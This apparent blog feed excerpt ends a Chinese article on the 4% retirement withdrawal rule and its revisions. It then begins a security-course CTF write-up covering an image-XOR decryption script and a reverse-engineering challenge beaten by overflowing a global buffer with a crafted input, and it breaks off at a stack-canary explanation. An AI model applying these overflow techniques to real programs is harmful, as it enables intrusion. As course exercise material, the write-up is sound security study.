&lt;li&gt;股債各半的資產配置 (文章欠詳述但值得研究)&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;最近美國、台灣均釀股災，全球通膨卻仍漲不停，這讓退休財務遭到空前考驗。不少財務專家擔憂，計算退休金的「4%黃金法則」在高通膨年代有可能失效。連該法則的發明人，與美國著名的先鋒指數基金公司，近期都提出新研究表示，舊有預設不夠穩當，甚有老本提早花光風險，退休族需要調適應變。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;「4%法則」到底是什麼？原來，這是1994年，由美國財務顧問威廉．班根（William Bengen）所提出，用來計算合理退休金的黃金法則。&lt;/p&gt;
&lt;p&gt;由於班根追蹤近30年美國股市大盤報酬，發現每年平均回報約為7至8%，若扣掉2～3%通膨後的年報酬率，則約為5%。所以，如果有人一年只提領老本中僅4%的金額，同時妥善做股債各半的投資配置，由於提領支出不會超過每年平均5%的報酬，這個人就可以年年提領不必擔心花光，達到退休要求。&lt;/p&gt;
&lt;p&gt;換句話說，若有人一年花費約100萬，依照4%法則，這個人只要存到2500萬就夠，因為2500萬的4%就是100萬，或可以直接把年花費乘以25倍更好計算。這個退休金的標準不高，因此深獲許多想提早退休的年輕人歡迎，包括前外資分析師楊應超，都善用此法則做理財規劃，在48歲成功退休。&lt;/p&gt;
&lt;p&gt;然而，去年底全球股市進入高檔、通膨也蠢蠢欲動，《富比世》便分析指出，「4%法則」在此狀況下，勢必讓退休族未來難有便宜股票可撿、同時卻面臨物價上升，被迫支出更多；而連原先用來保護報酬的公債，也因政府濫發熱錢、殖利率接近零，有可能讓老本提早花光。該怎麼辦？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;讀者QA&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;❓ 4%法則是指退休後的現金來源為 &lt;strong&gt;(1)以2500萬投資的報酬(本金的4%)當作生活費，而不花費本金&lt;/strong&gt;，還是 &lt;strong&gt;(2)每年提領2500萬的4%本金當作生活費&lt;/strong&gt;?&lt;br&gt;
💬 4% of initial $1 million，所以是(2)提領本金的4%(or動態調整為4%+-offset)，而(1)投資報酬又可補足本金。如圖。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 266; 
			flex-basis: 639px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-returns.png&#34; data-size=&#34;1133x425&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-returns.png&#34;
			width=&#34;1133&#34;
			height=&#34;425&#34;
			srcset=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-returns_hu0bd66e7423dc4c877f9f87134794c982_58359_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/updating-4-retire-rule/img-returns_hu0bd66e7423dc4c877f9f87134794c982_58359_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;❓ 股債各半是只2500的退休金全數投入股票和債券? 需花費時再兌現? 這樣很不實際吧?&lt;br&gt;
💬 全數投入。Bengen (1994) calculated the maximum percentage  that retirees could withdraw annually from their portfolio without running out of money over 30 years. Advisors refer to this percentage as the safe withdrawal rate.&lt;/p&gt;
&lt;p&gt;❓ 此份報告是針對美國民眾和市場的統計，龍蝦無法煎出牛排的味道，股債各半的投資模式適合台灣嗎?&lt;br&gt;
💬 dunno。&lt;/p&gt;
&lt;h2 id=&#34;4行不通乾脆45花更多&#34;&gt;4%行不通，乾脆4.5%花更多？&lt;/h2&gt;
&lt;p&gt;其實，就連此法則的發明人班根，都注意到上述變數的威脅。&lt;/p&gt;
&lt;p&gt;他近期與另一位財務顧問麥可．奇斯（Michael Kitces）重新研究，將美國1968年曾歷經停滯性通膨、股市低迷的最糟狀況納入模擬，推翻原先說法，推出全新「4.5%法則」。&lt;/p&gt;
&lt;p&gt;為什麼新的法則，竟讓每年提領比例從4%變為4.5%？主要是班根認為，在物價飛漲預期下，要退休族再掐緊荷包實在太辛苦，不如適當擁抱股市、以合理風險換取較高收益。&lt;/p&gt;
&lt;h2 id=&#34;新法則關鍵在資產配置&#34;&gt;新法則關鍵在「資產配置」&lt;/h2&gt;
&lt;p&gt;但是在資產配置上，原先班建議的股債各半規劃，是大型股與美國中期公債各五成的配比。現在則改為30%大型股；20%小型股；50%美國中期公債的配比。&lt;/p&gt;
&lt;p&gt;由此可見，新法則是運用成長潛力較高的小型股，來提高整體報酬，讓退休族支出可以更充裕。班根指出，以全新的模擬回測來看，30年內的投資平均年報酬，維持在7%上下，絕對能支應4.5%的花費比例。&lt;/p&gt;
&lt;p&gt;另外，他也呼籲，無論4%或4.5%，僅是第一年的費用提領比例，未來還是要看各年通膨狀況做微調。&lt;/p&gt;
&lt;p&gt;不過，美國首創追蹤大盤ETF、許多退休族最愛的先鋒（Vanguard）基金公司，則認為班根理論充滿漏洞。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://personal.vanguard.com/pdf/ISGFIRE.pdf&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;先鋒團隊今年中提出研究報告指出&lt;/a&gt;，不論是4%或4.5%也好，這個法則最大問題是，它當初只是為了美國平均60歲左右人士，屆齡退休的30年內狀況來設計。然而，根據他們調查，千禧世代都傾向提早於50歲前就退休，在人類普遍壽命更長的預期下，至少得把退休後預設時間範圍，拉長到50年才行。當時間一長，各類黑天鵝發生的機率勢必大增。&lt;/p&gt;
&lt;h2 id=&#34;先鋒示警拉長到50年4法則成功機率僅剩36&#34;&gt;先鋒示警：拉長到50年，「4%法則」成功機率僅剩36%&lt;/h2&gt;
&lt;p&gt;事實上，根據先鋒基金團隊模擬股市上百種變化的數據顯示，4%法則若維持在30年內，成功實踐退休夢的機率尚有81.9%；若拉長到50年，就僅剩36%。屆時每三個提早退休族，就至少會有一人得在年事已高的階段，還得回頭找工作賺取收入。&lt;/p&gt;
&lt;p&gt;而這個數據，還未考慮到政府稅率和交易手續費。誰會知道，幾十年後，政府加稅的幅度將有多大？&lt;/p&gt;
&lt;p&gt;至於班根用歷史回測，就樂觀斷定股市報酬一定能抵過通膨與每年固定花費，在先鋒團隊看來也覺得太天真。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 128; 
			flex-basis: 307px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-success-rate.png&#34; data-size=&#34;570x445&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-success-rate.png&#34;
			width=&#34;570&#34;
			height=&#34;445&#34;
			srcset=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-success-rate_hu773d4ad56256fceb5ca134a55e97a2ef_57451_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/updating-4-retire-rule/img-success-rate_hu773d4ad56256fceb5ca134a55e97a2ef_57451_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;附上遠見雜誌所引用成功機率圖&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;附上遠見雜誌所引用成功機率圖&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;動態提領策略較能應付不同年代危機&#34;&gt;「動態提領策略」較能應付不同年代危機&lt;/h2&gt;
&lt;p&gt;難道人們就得打消提早退休的美夢？先鋒基金公司倒不這麼認為，根據他們的研究顯示，如果採取「動態提領」策略，比較能因應不同年代的風險。&lt;/p&gt;
&lt;p&gt;首先，妥善計算過每年花費，同時設定一個年花費上限天花板以及下限，也許是平均年花費再往上加5%；或往下扣1.5%。接著定期於每年底，看待當年股市投資報酬的狀況作明年費用規劃。&lt;/p&gt;
&lt;p&gt;如果，今年投資報酬是正20%，遠高於你原先設定的報酬目標，那麼花費就可以大方一點，只要別超過年支出的上限即可；但如果今年投資報酬僅剩1%，或甚至為負，那明年就得節省一點，別低於該年支出的底線即可，但建議同步撥更多錢到股市。因為報酬差，通常代表股市已進入低檔，較有便宜可撿。&lt;/p&gt;
&lt;p&gt;以今年以來台股與美股大盤表現來看，目前股市報酬都還相當正面，算是好年。但若年底漲幅吐回，以動態提領策略來看，退休族就得看狀況調低明年花費。&lt;/p&gt;
&lt;p&gt;無論你覺得4%、4.5%法則較優；還是先鋒基金建議的「動態提領」策略較符合現實，這些在在說明了，退休後的花費很難估算，光是通膨改變就能打掛原先預設，而且時間愈長、意外愈多。&lt;/p&gt;
&lt;p&gt;想提早退休的人，規劃之前請多考慮上述變數，以免往後還得摸摸鼻子回來上班。&lt;/p&gt;
&lt;h2 id=&#34;case-study&#34;&gt;Case Study&lt;/h2&gt;
&lt;p&gt;幫遠見雜誌補充個案例，我只貼 case 2 即第一年投資報酬率 0%，第一年投資報酬率 -10% 的情況下，該怎麼提領的試算。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 444; 
			flex-basis: 1066px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-assump.png&#34; data-size=&#34;1142x257&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-assump.png&#34;
			width=&#34;1142&#34;
			height=&#34;257&#34;
			srcset=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-assump_hucf70d47066bb4de80d5f616ecac9fa50_46625_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/updating-4-retire-rule/img-assump_hucf70d47066bb4de80d5f616ecac9fa50_46625_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;assumption&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;assumption&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 148; 
			flex-basis: 357px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-case2.png&#34; data-size=&#34;1162x781&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-case2.png&#34;
			width=&#34;1162&#34;
			height=&#34;781&#34;
			srcset=&#34;https://weberlu88.github.io/p/updating-4-retire-rule/img-case2_huf3ba1938106bd880280ea57a4a82142b_232558_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/updating-4-retire-rule/img-case2_huf3ba1938106bd880280ea57a4a82142b_232558_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;case 2&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;case 2&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>計算機安全 HW0 CTF write-up</title>
        <link>https://weberlu88.github.io/p/hw0/</link>
        <pubDate>Fri, 08 Oct 2021 00:00:00 +0000</pubDate>
        
        <guid>https://weberlu88.github.io/p/hw0/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;Me: R10725012 呂晟維&lt;br&gt;
CTF Account: ConstAaEqual7&lt;br&gt;
Co-operator: R10725052&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;crypto---image-xor&#34;&gt;Crypto - Image xor&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;題目附了一個加密的程式，可以發現他是用 &lt;code&gt;arr[i][j] ^= random.randint(0,255)&lt;/code&gt; xor 來加密。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;flag.png ^ randint =  enc_flag.png&lt;/li&gt;
&lt;li&gt;golem.png ^ randint = enc_golem.png&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配合 xor 做兩次等於沒做的特性以及他的結合率，可以推得以下式子，把 randint 雜訊消除:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(flag.png ^ randint) ^ (golem.png ^ randint) = flag.png ^ golem.png&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Decrypt script&lt;/strong&gt;&lt;br&gt;
每種邏輯運算都做做看。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;cv2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;google.colab.patches&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2_imshow&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;img_a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;imread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;flag_enc.png&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IMREAD_GRAYSCALE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;img_b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;imread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;golem_enc.png&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IMREAD_GRAYSCALE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bitwiseOr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwise_or&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;img_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;img_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cv2_imshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwiseOr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bitwiseXor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwise_xor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;img_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;img_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cv2_imshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwiseXor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bitwiseAnd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cv2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwise_and&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;img_a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;img_b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cv2_imshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bitwiseAnd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 聽說這樣的畫質更清晰 cv2_imwrite(img_a ^ img_b)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 80; 
			flex-basis: 192px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/hint.png&#34; data-size=&#34;868x1080&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/hint.png&#34;
			width=&#34;868&#34;
			height=&#34;1080&#34;
			srcset=&#34;https://weberlu88.github.io/p/hw0/hint_hu982980fa26eebdc9740973d9e8fdceaa_390557_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/hint_hu982980fa26eebdc9740973d9e8fdceaa_390557_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Flag&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Flag&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;rev---global-variable-overflow&#34;&gt;Rev - Global variable overflow&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Reverse engineering dumping C code&lt;/strong&gt;&lt;br&gt;
這題是一個 XAYB 的猜數字遊戲，透過 IDA 反組譯出程式碼，嘗試接合 main、game_logic、gen_ans 三個函數，發現可以直接產生 flag 字串，但好像缺了幾個字。一時沒有頭緒只好換方法。
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 336; 
			flex-basis: 808px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-cpp.png&#34; data-size=&#34;569x169&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-cpp.png&#34;
			width=&#34;569&#34;
			height=&#34;169&#34;
			srcset=&#34;https://weberlu88.github.io/p/hw0/img-cpp_hu99791748d0dcd13395f60c6c609d65c3_8302_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-cpp_hu99791748d0dcd13395f60c6c609d65c3_8302_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Closer look into game logic&lt;/strong&gt;&lt;br&gt;
仔細看 game_logic 函數，在遊戲開始時並不會直接要你猜數字，會先讓玩家輸入長度 %100s 的字串並存入 &lt;code&gt;backdoor&lt;/code&gt; 變數，才呼叫 gen_ans() 產生出答案。疑? 原來 backdoor 是個未初始化的全域變數，可以在 &lt;code&gt;.bss&lt;/code&gt; section 中發現未初始化的全域變數還有 4 個(如下)，這時會對四個全域變數做驗證，如果驗證通個會偷偷印出答案！&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;byte_4082&lt;/li&gt;
&lt;li&gt;byte_4088&lt;/li&gt;
&lt;li&gt;byte_408D&lt;/li&gt;
&lt;li&gt;byte_408E&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這 4 個全域變數大小都是一個 byte，在 C 中 char 型別剛好是 1 個 byte，範圍是 0x0000 ~ 0x1111，假如這四個變數都是 signed char 那他們的十進位範圍為 -128~127。 (補充: int 是 4B，short 是 2B)
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 175; 
			flex-basis: 422px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-game-logic.png&#34; data-size=&#34;816x464&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-game-logic.png&#34;
			width=&#34;816&#34;
			height=&#34;464&#34;
			srcset=&#34;https://weberlu88.github.io/p/hw0/img-game-logic_hu0918dab0b358e5bbdfd0c6ff2ee008e5_34500_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-game-logic_hu0918dab0b358e5bbdfd0c6ff2ee008e5_34500_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;game_logic() 在遊戲開始前會將使用者的輸入存進 backdoor&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;game_logic() 在遊戲開始前會將使用者的輸入存進 backdoor&lt;/figcaption&gt;
	
&lt;/figure&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 82; 
			flex-basis: 198px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-gan-ans.png&#34; data-size=&#34;648x784&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-gan-ans.png&#34;
			width=&#34;648&#34;
			height=&#34;784&#34;
			srcset=&#34;https://weberlu88.github.io/p/hw0/img-gan-ans_hu399fd06b570714ab30a8d143729a2cc8_47276_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-gan-ans_hu399fd06b570714ab30a8d143729a2cc8_47276_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;line 24, 27 各有一個 if 驗證四個全域變數的值&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;line 24, 27 各有一個 if 驗證四個全域變數的值&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;br&gt;
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 290; 
			flex-basis: 696px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-ida-backdoor.png&#34; data-size=&#34;877x302&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-ida-backdoor.png&#34;
			width=&#34;877&#34;
			height=&#34;302&#34;
			srcset=&#34;https://weberlu88.github.io/p/hw0/img-ida-backdoor_hu451c8ecc18240bb716f94a73f1b64771_26721_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-ida-backdoor_hu451c8ecc18240bb716f94a73f1b64771_26721_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;byte_xxxx 變數都是 1 byte 大小，但中間有空格，不是連續儲存的&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;byte_xxxx 變數都是 1 byte 大小，但中間有空格，不是連續儲存的&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Solve the Math Problem&lt;/strong&gt;&lt;br&gt;
兩個 if 區塊的驗證是一段數學謎題，第一個 if 很簡單，除 8 回去就找到答案了；第二個 if 我們需要做質因數分解(Prime factorization)，也許有多種解法。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;變數&lt;/th&gt;
&lt;th&gt;值 (#解一)&lt;/th&gt;
&lt;th&gt;值 (#解二)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;byte_4082&lt;/td&gt;
&lt;td&gt;71 = G&lt;/td&gt;
&lt;td&gt;71 = G&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;byte_4088&lt;/td&gt;
&lt;td&gt;78 = N&lt;/td&gt;
&lt;td&gt;126 = ~&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;byte_408D&lt;/td&gt;
&lt;td&gt;110 = n&lt;/td&gt;
&lt;td&gt;131 =  (超過127了舉得不好&amp;hellip;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;byte_408E&lt;/td&gt;
&lt;td&gt;105 = i&lt;/td&gt;
&lt;td&gt;88 = X&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Overflow to get the answer &amp;amp; win the game&lt;/strong&gt;&lt;br&gt;
由於這四個變數是非連續儲存的，我們用字串 &lt;code&gt;a&lt;/code&gt; 補齊空的記憶體位置，若採用解法一，我們輸入 aaGaaaaaNaaaani 以開始遊戲（G=71, N=78, n=110, i=105）:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;G*8=568&lt;/li&gt;
&lt;li&gt;n*i+N=11628&lt;br&gt;
程式便會吐出答案，但是順序是倒序的。
&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 211; 
			flex-basis: 507px&#34;
	&gt;
	&lt;a href=&#34;https://weberlu88.github.io/p/hw0/img-gdb-win.png&#34; data-size=&#34;628x297&#34;&gt;
		&lt;img src=&#34;https://weberlu88.github.io/p/hw0/img-gdb-win.png&#34;
			width=&#34;628&#34;
			height=&#34;297&#34;
			srcset=&#34;https://weberlu88.github.io/p/hw0/img-gdb-win_huee5516e1c37edfc50bbd013b28b9416a_144047_480x0_resize_box_3.png 480w, https://weberlu88.github.io/p/hw0/img-gdb-win_huee5516e1c37edfc50bbd013b28b9416a_144047_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;get flag with gdb&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;get flag with gdb&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;pwn---buffer-overflow&#34;&gt;Pwn - Buffer overflow&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Checksec: No pie, No canary&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;canary&lt;/strong&gt;: 保護 return address 的機制。會在每個 function stack frame 的 local variable 之後 saved rbp 之前的位置，加上 8 bytes 的隨機值，在 function epilogue 時會檢查取用另一 segment 中 canary 的值檢查兩者是否一致，若不一致則直接 abort 調程式而不會進行 return。&lt;/li&gt;
